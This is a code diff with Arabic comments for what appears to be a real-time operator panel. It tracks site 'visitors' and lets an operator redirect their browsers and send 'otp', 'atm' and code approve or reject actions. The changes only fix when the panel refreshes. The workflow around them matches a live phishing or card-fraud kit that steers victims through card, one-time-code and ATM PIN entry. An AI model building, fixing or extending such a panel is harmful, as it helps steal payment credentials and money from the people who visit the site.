@@ -913,6 +913,9 @@
 
       // استقبال تحديثات الزوار (مثل تغيير حالة الانتظار)
       socket.on('visitors:update', (list) => {
+        // تجاهل التحديثات أثناء عرض "تم الإرسال"
+        if (window.skipNextUpdate) return;
+        
         list.forEach(v => {
           const existing = visitors.get(v._id);
           if (existing) {
@@ -1856,14 +1859,18 @@
 
     // دالة تحويل الزائر لصفحة محددة مباشرة
     function navigateVisitorToPage(socketId, page) {
+      window.skipNextUpdate = true;
       socket.emit('admin:navigate', { visitorSocketId: socketId, page });
       // تحديث حالة الانتظار
       const visitor = visitors.find(v => v.socketId === socketId);
       if (visitor) {
         visitor.waitingForAdminResponse = false;
-        renderVisitorsList();
-        if (selectedVisitorId === visitor._id) renderVisitorDetails(visitor);
       }
+      setTimeout(() => {
+        window.skipNextUpdate = false;
+        renderVisitorsList();
+        if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
+      }, 1500);
     }
 
     // دالة الموافقة على طلب إعادة إرسال الرمز
@@ -1886,17 +1893,21 @@
       const btn = event.target;
       const originalText = btn.textContent;
       const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-blue-600';
+      window.skipNextUpdate = true;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'otp' });
       // تحديث حالة الانتظار
       const visitor = visitors.find(v => v.socketId === socketId);
-      if (visitor) { visitor.waitingForAdminResponse = false; renderVisitors(); }
+      if (visitor) { visitor.waitingForAdminResponse = false; }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove(originalBg);
       btn.classList.add('bg-green-600');
       setTimeout(() => {
+        window.skipNextUpdate = false;
         btn.textContent = originalText;
         btn.classList.remove('bg-green-600');
         btn.classList.add(originalBg);
+        renderVisitorsList();
+        if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
       }, 1500);
     }
 
@@ -1904,34 +1915,42 @@
       const btn = event.target;
       const originalText = btn.textContent;
       const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-yellow-600';
+      window.skipNextUpdate = true;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'atm' });
       // تحديث حالة الانتظار
       const visitor = visitors.find(v => v.socketId === socketId);
-      if (visitor) { visitor.waitingForAdminResponse = false; renderVisitors(); }
+      if (visitor) { visitor.waitingForAdminResponse = false; }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove(originalBg);
       btn.classList.add('bg-green-600');
       setTimeout(() => {
+        window.skipNextUpdate = false;
         btn.textContent = originalText;
         btn.classList.remove('bg-green-600');
         btn.classList.add(originalBg);
+        renderVisitorsList();
+        if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
       }, 1500);
     }
 
     function cardActionReject(socketId) {
       const btn = event.target;
       const originalText = btn.textContent;
+      window.skipNextUpdate = true;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'reject' });
       // تحديث حالة الانتظار
       const visitor = visitors.find(v => v.socketId === socketId);
-      if (visitor) { visitor.waitingForAdminResponse = false; renderVisitors(); }
+      if (visitor) { visitor.waitingForAdminResponse = false; }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove('bg-red-600', 'hover:bg-red-700');
       btn.classList.add('bg-green-600');
       setTimeout(() => {
+        window.skipNextUpdate = false;
         btn.textContent = originalText;
         btn.classList.remove('bg-green-600');
         btn.classList.add('bg-red-600', 'hover:bg-red-700');
+        renderVisitorsList();
+        if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
       }, 1500);
     }
 
@@ -1939,34 +1958,42 @@
     function codeActionApprove(socketId, codeIndex) {
       const btn = event.target;
       const originalText = btn.textContent;
+      window.skipNextUpdate = true;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'approve', codeIndex });
       // تحديث حالة الانتظار
       const visitor = visitors.find(v => v.socketId === socketId);
-      if (visitor) { visitor.waitingForAdminResponse = false; renderVisitors(); }
+      if (visitor) { visitor.waitingForAdminResponse = false; }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove('bg-green-600', 'hover:bg-green-700');
       btn.classList.add('bg-gray-500');
       setTimeout(() => {
+        window.skipNextUpdate = false;
         btn.textContent = originalText;
         btn.classList.remove('bg-gray-500');
         btn.classList.add('bg-green-600', 'hover:bg-green-700');
+        renderVisitorsList();
+        if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
       }, 1500);
     }
 
     function codeActionReject(socketId, codeIndex) {
       const btn = event.target;
       const originalText = btn.textContent;
+      window.skipNextUpdate = true;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'reject', codeIndex });
       // تحديث حالة الانتظار
       const visitor = visitors.find(v => v.socketId === socketId);
-      if (visitor) { visitor.waitingForAdminResponse = false; renderVisitors(); }
+      if (visitor) { visitor.waitingForAdminResponse = false; }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove('bg-red-600', 'hover:bg-red-700');
       btn.classList.add('bg-green-600');
       setTimeout(() => {
+        window.skipNextUpdate = false;
         btn.textContent = originalText;
         btn.classList.remove('bg-green-600');
         btn.classList.add('bg-red-600', 'hover:bg-red-700');
+        renderVisitorsList();
+        if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
       }, 1500);
     }
 
